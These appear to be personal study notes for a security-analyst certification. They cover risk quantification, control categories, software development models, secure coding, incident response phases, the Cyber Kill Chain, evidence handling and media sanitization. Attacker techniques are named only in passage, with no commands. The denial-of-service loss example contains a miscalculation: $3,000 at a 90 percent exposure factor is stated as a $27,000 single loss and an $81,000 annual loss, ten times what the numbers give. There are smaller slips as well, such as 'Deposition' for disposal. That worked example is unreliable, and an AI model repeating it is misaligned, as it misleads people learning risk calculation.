	- **Annualized Loss Expectancy (ALE):** amount of damage expected from the risk each year. Expressed in money. `ALE = SLE * ARO`

>Imagine that you are concerned about the risk associated with a denial-of-service (DoS) attack against your email server. Your organization uses that server to send email messages to customers offering products for sale. It generates **$1,000 in sales per hour** that it is in operation. After consulting threat intelligence sources, you believe that a DoS attack is **likely to occur three times a year and last for three hours** before you are able to control it. The asset in this case is not the server itself, because the server will not be physically damaged. The asset is the ability to send email and you have already determined that it is worth $1,000 per hour. The **asset value for three hours of server operation is, therefore, $3,000**. Your threat intelligence estimates that the **risk will occur three times per year**, making your **annualized rate of occurrence 3.0**. After consulting your email team, you believe that the **server would operate at 10 percent capacity** during a DoS attack, as some legitimate messages would get out. Therefore, your exposure factor is 90 percent, because 90 percent of the capacity would be consumed by the attack. Your single loss expectancy is calculated by multiplying the asset value ($3,000) by the exposure factor (90 percent) to get the expected loss during each attack. This gives you an **SLE of $27,000**. Your annualized loss expectancy is the product of the **SLE ($27,000) and the ARO (3.0), or $81,000.**

---
#### <u>Managing Risk</u>
1. **Risk Mitigation:** applying security control to mitigate the probability/magnitude of risk.
2. **Risk Avoidance:** business practice to completely mitigate the risk. E.g. Laptop theft is mitigated by not allowing employees to take laptop out of office.
3. **Risk Transference:** shifting some of the risk to another entity. E.g. purchasing an insurance policy than covers a risk.
4. **Risk Acceptance:** choosing to take no risk management strategy, and to simply continue operation as normal with the risk.

---
#### <u>Implementing Security Controls</u>
###### Security Control Categories:
- **Technical Controls:** hardware or software to protect system and data. E.g. Firewall, AV, encryption, ACL. Implemented through technology and enforced automatically by systems.
- **Operational Control:** for day-to-day procedures and practices to secure organization's operations. E.g. Security awareness training, IR plans, account review, etc.
- **Managerial Control:** policies and risk management strategies set by management to guide security posture. E.g. Risk assessment, Security policies, vendor risk assessment. Focus on governance, planning, and oversight.

###### Security Control Types:
- **Preventive Control:** stop security issue before it occurs. Firewalls, encryption, etc.
- **Detective Control:** identify security events that has already occurred. IDS, etc.
- **Responsive Control:** responds to an active security event. E.g. use of 24x7 security operations center that can triage and direct first responders.
- **Corrective Control:** remediate security issues that have already occurred. E.g. restoring backup after ransomware attack.
- **Compensating Control:** mitigate the risk associated with exceptions made to a security policy.

---
#### <u>Managing the Computing Environment</u>
###### Attack Surface Management
- **Edge Discovery:** identify any systems or devices with public exposure by scanning IP addresses.
- **Passive Discovery:** monitor inbound and outbound traffic to detect devices that did not appear during discovery scan.
- **Security Control testing:** verifying that the organization's array of security controls are functioning properly.
- **Penetration Testing:** emulate action of adversary to discover flaws.
###### Change and Configuration Management
- **Configuration Management:** tracks the way that specific endpoint devices are set up. Also tracks OS settings, inventory of software installed on a device.
- **Change Management:** provides organization formal process for identifying, requesting, approving, and implementing changes to configurations.
- **Baselining:** snapshot of a system or application at a given point. It may be used to access whether a system or application at has changed outside of an approved change management process.
- **Version Control:** assigning each release of a piece of software an incrementing version number that may be used to identify a given copy.

---
#### <u>Software Assurance Best Practice</u>
###### Software Development Life Cycle (SDLC)
-> Describes the steps in a model for software development throughout its life.
**Phases:**
1. **Feasibility Phase:** viability of a proposed project is assesses before moving forward with development.
2. **Analysis and requirement definition phase:** foundation is laid by understanding and documenting the needs of stakeholder.
3. **Design Phase:** includes design for functionality, architecture, integration points, data flow, business design, etc.
4. **Development Process:** actual coding of the application occurs, including unit testing for small components individually and code analysis.
5. **Testing and Integration Phase:** formal testing with customers or other outside of the development team. Individual units or software components are integrated and testing to ensure proper functionality. During this phase *User Acceptance Testing* (UAT) occurs to ensure that the users are satisfied.
6. **Training and Transition Phase:** to ensure end users are trained on the software and the software is being generally used. Also called acceptance, deployment, and installation phase.
7. **Ongoing Operation and Maintenance:** longest phase, includes patching, updating, minor fixes, and modifications.
8. **Deposition:** when product and or system reaches EOL. Important for cost saving, data must be disposed.

---
#### <u>Software Development Models</u>
1. **Waterfall:** sequential model, each phase is followed by the next phase. Phases do not overlap, and each logically leads to next. It is relatively inflexible, therefore replaced by many organizations.
2. **Spiral:** uses linear development concepts from the waterfall model and adds an iterative process that *revisits* four phases multiple times during the development cycle. Provides great flexibility to handle changes in requirement as well as external influences such as availability of customer feedback. Allows software development life cycle to start earlier in the phase that Waterfall does.
3. **Agile:** iterative and *incremental* process, rather than linear like waterfall and spiral. Breaks work up into smaller units, allowing work to be done more quickly and with less up-front planning. It focuses on adapting to needs, rather than predicting them. Work is broken into short working sessions called sprint.
	- Backlogs: list of tasks that are required to complete the task.
	- Planning poker: tool for estimation and planning.
	- Timeboxing: previously agreed-on time that a team uses to work on specific task. Time to work on a goal rather than work until completion.
	- User stories: used to describe high-level user requirements. E.g. "User can that their password via mobile app."

---
#### <u>Rapid Application Development (RAD)</u>
> Iterative process that relies on building prototype.
1. **Business Modeling:** focuses on business model, including what information is important, how it is processed, and what business process should invoke.
2. **Data Modeling:** gathering and analyzing all dataset needed to effort and define their attributes and relationship.
3. **Process Modeling:** process description on how data is to be handled.
4. **Application Generator:** through coding and automated tools to convert data and process models into prototype.
5. **Testing and turnover:** focuses on dataflow and interface between components since prototype are tested at each iteration for functionality.

---
#### <u>DevSecOps and DevOps</u>
- **Continuous Integration (CI):** development practice that checks code into a shared repo on a consistent ongoing basis.
- **Continuous Deployment/Delivery (CD):** rolls out tested changes into production automatically as soon as they have been tested.
###### Common Software Development Security Issue:
1. **Improper error handling:** results in error message that should not be exposed outside a secure environment being accessible to attacker
2. **Dereferencing issue:** due to null pointer dereference. Means that a pointer with value NULL is used as though it contains expected value.
3. **Insecure Object Reference:** when application exposes information about internal objects.
4. **Race Condition:** when multiple processes or threads attempt to access and modify shared resources simultaneously, leading to unpredictable behavior. 
5. **Broken Authentication:** Improperly implemented authentication may allow attackers who are not logged in as a user with correct rights to access resources.
6. **Use of insecure functions:** Functions like `strcpy` which does not have critical security features built in, can result in code which is easier for attacker to attack.

###### Secure Coding Practices
- Input Validation
- **Output encoding:** translate special character into an equivalent but safe version before a target application or interpreter reads it.
- **Secure Session Management:** ensure attacker cannot hijack user sessions.
- **Parameterized queries:** prevent SQL injection attacks by precompiling SQL queries so that new code may not be inserted when query is executed.

###### Software Assessment
- **Fuzzing:** sending invalid or random data to an application to test its ability to handle unexpected data.
- **Fault Injection:** testing technique used to evaluate a system's resilience by deliberately introducing faults or errors.
- **Mutation Testing:** Assesses the **effectiveness of test cases** by introducing small modifications (mutants) to the code. Changing a conditional statement (`if (x < 0)`) to (`if (x <= 0)`) and checking if test cases catch the difference.
- **Stress and Load Testing:** to ensure application and the system that support them can stand up to the full production load they are anticipated to need is part of a typical SDLC process. This is typically test for worst-case scenario.
- **Security Regression Testing:** to ensure that changes that have been made do not create new issue.
- **User Acceptance Testing:** Once all fundamental and security testing have been made, users are asked to validate whether it meets the business needs and usability requirements.

---
#### Policy, Governance and Service Level Objectives (SLO)
- **<u>Policies</u>:** high-level document that outlines an organization’s security expectations and rules. Policies establish the "what" and "why" of cybersecurity, such as requiring strong password practices, incident response protocols, or compliance with regulatory standards.
	- **Acceptable use Policy (AUP):** provides network and system users with clear direction on permissible use of information resources.
	- **Data retention policy:** what information the organization will maintain and the length of time.
	- **Code of conduct/ethics:** expected behavior of employees and affiliates and serves as a backstop for situation not specifically mentioned in policy.
- **<u>Standards</u>:** Specific technical requirements that define measurable criteria for implementing policies. For example, a security policy might state that encryption must be used, and the standard would specify that AES-256 encryption is required.
- **<u>Procedures</u>:** A step-by-step method to achieve a task in alignment with policies and standards. Procedures define the "how" of cybersecurity processes, such as how to conduct vulnerability scans, patch management, or forensic investigations.
- **<u>Guideline</u>:** Recommended best practices that provide flexible advice for security operations. Guidelines are not mandatory like policies or standards but help improve security posture, such as suggesting regular penetration testing or monitoring privileged accounts.

---
# 3. Incident Response and Management

#### <u>Security Incidents</u>
- **Event:** Observable occurrence in system or network.
- **Adverse Event:** event that has negative impact.
- **Security Incident:** violation of computer security policies, AUP aur standard security policies.
- **CSIRT:** Computer Security Incident Response Team, is responsible for responding to computer security incidents that occur within organization.
- **Attrition**: An attack that employs brute-force methods to compromise, degrade, or destroy systems, networks, or services - for example, a DDoS attack intended to impair or deny access to a service or application or a brute-force attack against an authentication mechanism

---
#### Before concluding the recovery effort, incident responders should take time to verify that the recovery measures put in place were successful.

- Validate only authorized accounts exists on every systems and application in the org.
- Verify proper restoration of permission assigned to each account.
- Verify the integrity of systems and data.
- Verify that all systems are logging properly.
- Conduct vulnerability scan on all system.
---
#### <u>Phases of IR</u>
1. **Preparation:** assemble hardware, software, and information required to conduct an incident investigation. This includes: Digital Forensics Workstation, backup devices, forensics and packet capture software, etc.
2. **Detection and Analysis:** Using multiple sources to detect if a security incident is happening. Analyzing those sources to to determine whether an incident is taking place that requires further IR process. NIST recommends some action to improve the effectiveness of incident analysis.
	- Profile Networks and systems to measure characteristics of expected activity.
	- Perform event correlation to combine information from multiple sources.
	- Synchronize clocks across servers, workstations, and network devices, etc.
3. **Containment, Eradication and Recovery:** Includes selecting appropriate containment strategy, implementing it to limit the damage caused. Also gather additional evidences as needed to support the response effort and legal action.
4. **Post-Incident Activity:** Once immediate danger passes, forensics team undertake forensics procedures to perform root cause analysis, conduct lessons learned review.
	- **Root Cause Analysis:** correct any controlled deficiencies that let to the attack in the first place.

---
#### <u>Classifying Incidents</u>
- **Severity Classification**
	- **Functional Impact:** is the degree of impairment that is cause to the organization.
	- **Economic Impact:** not included in NIST, but it's the financial impact due to the incident.
	- **Recoverability Effort:** measure of the time for which the services will be unavailable.
	- **Datatypes:** the nature of data involved in a security incident also contributes to the incident severity.
- **PII:** Personal Identifiable Information
- **PHI:** Personal Health Information
- **SPI:** Sensitive Personal Information

---
#### <u>Attack Frameworks</u>
**Lockheed Martin's Cyber Kill Chain:**
1. **Reconnaissance** (OSINT Framework, Email Harvesting)
2. **Weaponization**
	*Macro: group of commands for specific tasks (subroutines), contains automation scripts.* 
	(https://www.trustedsec.com/blog/intro-to-macros-and-vba-for-script-kiddies)
3. **Delivery** (Phishing email, water holing, bad USB, etc.)
4. **Exploitation:** After gaining access to the system (through credential harvesting or macro attachment), software, systems, or server are exploited to escalate privilege or lateral movement.
5. **Installation:** Installation of web shells or backdoors for persistent access. **Timestomping** is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.
6. **Command & Control:** The infected machine makes constant DNS requests to the DNS server that belongs to an attacker, this type of C2 communication is also known as **DNS Tunneling**. 
7. **Exfiltration:** **Shadow Copy** is a Microsoft technology that can create backup copies, snapshots of computer files, or volumes. Important to delete for clean up.

---

- Filesystem monitoring tools **OSSEC** (Open Source HIDS SECurity) and **Tripwire** serve as host intrusion detection systems monitoring for intrusion behavior like unauthorized file\ system modification.

#### <u>Evidence Acquisition and Preservation</u>
1. **Preservation:** requires acquiring data, validating it, and storing it in a secure and documented manner. Typically require chain-of-custody documentation.
2. **Chain of Custody:** track evidence throughout its life cycle, including the collection, preservation and analysis of the data. When, where and how it is stored. Helps to ensure the data was not inappropriately accessed or modified.
3. **Legal Hold:** part of eDiscovery process. Issued by legal council when lawsuit is about to begin or underway. Legal team send **Legal Hold Notice** to the organization. Data Custodian in organizations must not delete or modify certain information.

---
#### <u>Sanitization and Secure Disposal</u>
**NIST SP 800-88: Guidelines for Media Sanitization:-**
- **Clear:** This method removes sensitive data in a way that prevents casual recovery using standard software or operating system functions. Examples include deleting files and overwriting data with non-sensitive information. However, advanced forensic tools might still retrieve data after clearing.
- **Purge:** A more robust method that makes data recovery extremely difficult, even with advanced forensic techniques. Purging includes techniques like degaussing (using strong magnets to scramble data on magnetic media) or overwriting multiple times with random patterns.
- **Destroy:** This is the most extreme method, ensuring that data is completely irrecoverable. Destroying data typically involves physically destroying the storage medium—such as shredding hard drives, incinerating disks, or chemically dissolving flash memory.
![[Pasted image 20250609221233.png]]

- NIST recommends using six criteria to evaluate a containment strategy: the **potential damage** to resources, the need for **evidence preservation**, **service availability**, **time** and **resources required (including cost)**, **effectiveness** of the strategy, and **duration** of the solution.

| **Concept**      | **Definition**                                                                          | **Purpose**                                                        | **Key Techniques**                                               | **When to Apply**                                   |
| ---------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------- | --------------------------------------------------- |
| **Segmentation** | Dividing a network into smaller, controlled sections to limit access and movement       | Proactive security measure to restrict lateral movement of threats | VLANs, subnetting, firewall rules, Zero Trust architecture       | **Before an incident** to enhance security posture  |
| **Isolation**    | Cutting off an infected system or compromised environment from the rest of the network  | Containment strategy to prevent threat spread                      | Sandboxing, disconnecting network access, restricting privileges | **During an active incident** to contain threats    |
| **Removal**      | Eradicating the malware, unauthorized software, or compromised elements from the system | Eliminates the threat permanently and restores system integrity    | Malware removal tools, reimaging systems, secure data wiping     | **After containment** to ensure the system is clean |

### **Quick Mnemonic to Remember**:

- **Segmentation → Prevention**
- **Isolation → Containment**
- **Removal → Eradication**

---
#### Vulnerability Management Reporting and Communication
- **Vulnerability Report includes:**
	- Vulnerabilities (CVEs, name, description, and other info)
	- A list of **affected hosts** with IP and hostname if resolved.
	- A **risk score** that provides quantitative measure.
	- Mitigation options, including patches, updates, and workarounds.
	- Information and recurrence, if vulnerability has reappeared.
	- Prioritization information.

- **Stakeholder Identification and Communication:**
	- **Technical Stakeholder:** allow them to work in proper order after getting info on vulnerability, prioritization, and mitigation.
	- **Security, audit and compliance stakeholder:** need to have overall vulnerability stance of the organization.
	- **Security Management:** ingest vulnerability information to provide additional context for security operation.
	- **Executive or leadership staffs:** provide oversight and are responsible for the organization's overall performance and security.

- **Compliance Report:** VMS typically provides specialized reports designed to provide compliance information aligned to common compliance target such as PCI DSS

---
#### Action Plans
1. **Configuration Management:** Simply configuring services and application to not expose potential vulnerable ports, removing or changing default configurations, otherwise hardening it. Also used to define baseline configurations.
2. **Patching:** Patches are not simple, they may cause service outage or introduce new issues.
3. **Compensating Controls:** In cases where patch cannot be installed or doesn't exist, compensating controls may be used. E.g. *disabling a service until patched*

---
#### Vulnerability Management Metrics and KPI (Key Performance Indicator)
- Trends: no. of vulnerabilities, their severity or risk rating, and the time to remediate.
- Top 10 lists useful for focusing organizational resources. However not recommended to solely reply on top 10 lists.
- Critical Vulnerabilities
- Zero Days: announced before they are patched. Cannot be identified by configuration or vulnerability management system.
- Service Level Objectives (SLO): describes specific metrics like time to remediate or patch.

---
#### Inhibitor to Remediation
A **Memorandum of Understanding (MOU)** and a **Service Level Agreement (SLA)** serve distinct roles in business and cybersecurity agreements
- **MOU (Memorandum of Understanding):**
    - A formal document that outlines a mutual understanding between parties.
    - Not legally binding but establishes intent.
    - Used for collaborations, partnerships, or agreements that don't require enforceability.
- **SLA (Service Level Agreement):**
    - A legally binding contract that defines service expectations.
    - Specifies metrics like uptime, response time, and security commitments.
        - Essential for ensuring service providers meet agreed-upon standards.
